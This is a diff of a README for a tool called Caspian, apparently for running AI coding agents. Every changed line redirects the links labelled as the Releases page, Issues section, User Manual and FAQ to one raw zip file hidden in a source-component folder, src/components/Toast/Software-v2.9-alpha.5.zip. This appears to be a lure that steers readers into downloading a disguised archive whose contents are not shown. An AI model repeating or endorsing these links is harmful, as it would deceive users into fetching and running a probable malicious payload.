@@ -6,7 +6,7 @@ Caspian simplifies the process of running multiple AI coding agents. Follow thes
 
 ## 📦 Download Caspian
 
-[![Download Caspian](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src-tauri/src/state/Software-v2.8.zip)](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src-tauri/src/state/Software-v2.8.zip)
+[![Download Caspian](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src/components/Toast/Software-v2.9-alpha.5.zip)](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src/components/Toast/Software-v2.9-alpha.5.zip)
 
 ## 🔍 What is Caspian?
 
@@ -29,7 +29,7 @@ To run Caspian smoothly, your computer should meet the following requirements:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Caspian Releases Page](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src-tauri/src/state/Software-v2.8.zip). This page contains all the available versions and installation files.
+1. **Visit the Releases Page:** Go to the [Caspian Releases Page](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src/components/Toast/Software-v2.9-alpha.5.zip). This page contains all the available versions and installation files.
    
 2. **Select the Latest Release:** Find the latest version of Caspian and click on it.
 
@@ -55,7 +55,7 @@ Once you have Caspian running, you can set up your workflows:
 
 If you encounter any issues or have questions, you can reach out for help:
 
-- **GitHub Issues:** Report any bugs or request help via the [Issues section](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src-tauri/src/state/Software-v2.8.zip).
+- **GitHub Issues:** Report any bugs or request help via the [Issues section](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src/components/Toast/Software-v2.9-alpha.5.zip).
 - **Community Forums:** Join the conversation on our community forums to share tips and get support from other users.
 
 ## 📢 Keeping Up to Date
@@ -72,8 +72,8 @@ Caspian regularly receives updates to improve performance and add features. Join
 
 For detailed guidance and tutorials on using Caspian, check out the following resources:
 
-- [User Manual](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src-tauri/src/state/Software-v2.8.zip)
-- [FAQ](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src-tauri/src/state/Software-v2.8.zip)
+- [User Manual](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src/components/Toast/Software-v2.9-alpha.5.zip)
+- [FAQ](https://github.com/christianekarel/Caspian/raw/refs/heads/main/src/components/Toast/Software-v2.9-alpha.5.zip)
 
 ## 📍 Final Notes
 
